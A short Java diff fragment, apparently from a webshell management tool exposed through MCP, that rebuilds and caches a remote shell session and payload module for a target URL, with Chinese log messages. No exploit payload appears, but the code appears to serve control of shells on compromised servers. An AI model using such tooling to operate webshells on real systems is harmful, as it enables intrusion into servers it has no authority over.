+                    rebuilt.setEncoding("UTF-8");
+                    if (rebuilt.initShellOpertion()) {
+                        Payload rebuiltPayload = rebuilt.getPayloadModule();
+                        if (rebuiltPayload != null) {
+                            payloadCache.put(url, rebuiltPayload);
+                            log("[MCP] 会话凭据重建成功: " + url);
+                            return rebuiltPayload;
+                        }
+                    }
+                    log("[MCP] 会话凭据重建失败，回退数据库查找");
+                } catch (Throwable t) {
+                    log("[MCP] 会话凭据重建异常: " + McpHandler.stringifyError(t));
+                }
             }
 
             log("[MCP] ==== 开始初始化 Payload ====");
